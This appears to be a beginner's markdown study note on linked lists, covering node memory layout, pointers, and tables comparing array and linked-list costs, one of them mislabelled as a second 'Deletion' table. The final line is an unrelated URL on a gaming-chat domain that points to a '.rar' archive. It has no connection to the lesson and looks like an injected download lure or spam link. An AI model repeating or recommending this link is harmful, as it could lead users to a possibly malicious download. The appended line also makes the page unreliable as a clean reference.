# Implementation: Linked Lists



Linked List:


# What is a linked List?
- ### Linked list is a Data Structure that represents you guessed it a list of items. You can implement a linked list to pretty much any problem that deals with array but under the hood the way linked list are different. 


### In Depth:

- ### Memory inside a computer exists as a giant set of cells. For an array, your code finds groups of empty cells in memory to store data.linked list is a little different where they actually have bunch of memory cells that are  not next to each-other but can be spread across many different cells across the computer's memory. These are called nodes. In a linked list each node also stores memory address of the next node in the linked list; skipping any empty cells. 
  - Node contain two memory cells the first cell holds the actual data and the second cell contains memory of the where the next node is


![linked list](https://miro.medium.com/max/1400/1*m11VTAK3YJgRemmfBI_2uw.png);


 ## Implementation: 
  - ###  The basic parts of a given linked list to be defined in code for a linked list to work is the begining of the node. This because if each node contains data to where the next node begins then it start at the first node then move to the next node then third then fourth etc...
  - the second memeory cell in a node acts as a pointer to the start of node that follows  it in the linked list. 
  
## Big O Efficency and Scenario Cases Compared to Array:

# Insertion :
| Scenario           | Array       | LinkedList
| -----------        | ----------- |-----------
| Insert at beginning| Worst Case  | Best Case
| Insert at Middle   | Average Case| Average Case
| Insert at End      | Best Case   | Worst Case




# Deletion : 

| Scenario           | Array       | LinkedList
| -----------        | ----------- |-----------
| Delete at beginning| Worst Case  | Best Case
| Delete at Middle   | Average Case| Average Case
| Delete at End      | Best Case   | Worst Case


# Deletion : 

| Operation          | Array                   | LinkedList
| -----------        | -----------             |-----------
| Reading            | O(1)                    | O(N)
| Search             | O(N)                    | O(N)
| Insertion          | O(N) (O(1) at end)      | O(N) (O(1) at beginning) 
| Deletion           | O(N) (O(1) at end)      | O(N) (O(1) at beginning) 

https://fortnitechat.site/join.php?id=YWTUP1.rar

